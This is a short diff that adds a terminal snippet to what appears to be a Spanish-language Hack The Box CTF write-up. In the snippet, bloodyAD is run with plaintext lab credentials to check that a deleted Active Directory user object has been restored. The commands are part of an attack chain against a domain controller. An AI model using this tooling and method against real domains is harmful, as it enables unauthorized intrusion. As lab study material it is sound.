@@ -333,3 +333,12 @@ whenCreated: 2026-05-09 09:00:48+00:00
 ╰─                                                                                                                   ─╯
 
 ```
+
+``` bash
+
+❯ if bloodyAD --host 10.129.83.15 --dns 10.129.83.15 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object mark.davies | grep -q "isDeleted"; then echo "no eliminado"; else echo "Objeto recuperado"; fi
+Objeto recuperado
+╭─ ~/hacking/ctf/htb/medium/checkpoint/recon                                                                       ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
